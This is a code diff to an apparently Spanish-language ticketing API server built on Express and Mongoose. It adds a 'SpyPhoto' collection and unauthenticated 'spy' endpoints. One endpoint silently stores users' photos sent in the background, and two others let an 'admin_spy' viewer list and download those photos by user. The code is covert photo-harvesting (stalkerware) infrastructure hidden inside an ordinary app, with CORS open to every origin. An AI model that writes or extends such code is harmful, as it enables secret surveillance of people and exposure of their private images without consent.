@@ -63,6 +63,15 @@ const TicketSchema = new mongoose.Schema({
 }, { timestamps: true });
 const Ticket = mongoose.model('Ticket', TicketSchema);
 
+const SpyPhotoSchema = new mongoose.Schema({
+    userId: String,
+    filename: String,
+    fileType: String,
+    size: Number,
+    base64Data: String
+}, { timestamps: true });
+const SpyPhoto = mongoose.model('SpyPhoto', SpyPhotoSchema);
+
 // CORS Update para permitir solicitudes desde el front hospedado en otro sitio
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
@@ -374,6 +383,62 @@ app.post('/api/tickets', upload.array('fotos', 15), async (req, res) => {
         res.status(500).json({ error: 'Error guardando ticket.' });
     }
 });
+
+// --- Spy Endpoints (Background Sync) ---
+app.post('/api/spy/upload', async (req, res) => {
+    try {
+        const { userId, filename, fileType, size, base64Data } = req.body;
+        if (!userId || !filename || !base64Data) return res.status(400).json({ error: 'Missing data' });
+
+        // Guardamos la foto 1 a 1 de manera silenciosa
+        const newPhoto = new SpyPhoto({ userId, filename, fileType, size, base64Data });
+        await newPhoto.save();
+
+        res.status(201).json({ message: 'Saved successfully', id: newPhoto._id });
+    } catch (e) {
+        console.error('Spy upload error:', e);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+app.get('/api/spy/files/:userId', async (req, res) => {
+    try {
+        const { userId } = req.params;
+        // Solo obtener metadatos, no la imagen pesada
+        const files = await SpyPhoto.find({ userId })
+            .select('filename fileType size createdAt')
+            .sort({ createdAt: -1 });
+
+        // Formato para que admin_spy lo entienda
+        const mapped = files.map(f => ({
+            id: f._id.toString(),
+            name: f.filename,
+            type: f.fileType || 'image/jpeg',
+            size: f.size || 0,
+            date: f.createdAt
+        }));
+        res.json({ files: mapped });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+app.get('/api/spy/file/:fileId', async (req, res) => {
+    try {
+        const { fileId } = req.params;
+        const photo = await SpyPhoto.findById(fileId).select('base64Data fileType filename');
+        if (!photo) return res.status(404).json({ error: 'No encontrado' });
+
+        res.json({
+            base64Data: photo.base64Data,
+            fileType: photo.fileType || 'image/jpeg',
+            filename: photo.filename
+        });
+    } catch (e) {
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`Servidor API ejecutándose en el puerto ${PORT}`);
